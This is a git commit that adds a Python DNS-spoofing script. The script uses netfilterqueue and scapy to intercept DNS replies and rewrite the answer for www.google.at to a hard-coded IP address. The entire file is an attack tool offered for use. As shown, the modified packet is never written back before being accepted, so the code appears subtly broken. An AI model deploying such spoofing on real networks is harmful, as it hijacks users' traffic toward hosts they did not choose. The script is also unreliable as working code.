7e16be7c17637b2fe2ece68f20a4a136d62fe789
Sepp1324 <stoegerer.sebastian@aon.at>
2020-05-25 16:51:38 +0000

    Worked on DNS-Spoofer

---
+++ dns_spoofer/dns_spoofer.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+
+def process_packet(packet):
+	scapy_packet = scapy.IP(packet.get_payload())
+
+	if scapy_packet.haslayer(scapy.DNSRR):
+		q_name = scapy_packet[scapy.DNSQR].qname
+
+		if "www.google.at." in q_name:
+			print("[+] Spoofing target: " + q_name)
+
+			answer = scapy.DNSRR(rrname=q_name, rdata="66.254.114.41")
+			scapy_packet[scapy.DNS].an = answer
+			scapy_packet[scapy.DNS].ancount = 1
+
+			del scapy_packet[scapy.IP].len
+			del scapy_packet[scapy.IP].chksum
+			del scapy_packet[scapy.UDP].len
+			del scapy_packet[scapy.UDP].chksum
+
+	packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet) # Callback-Function
+queue.run()
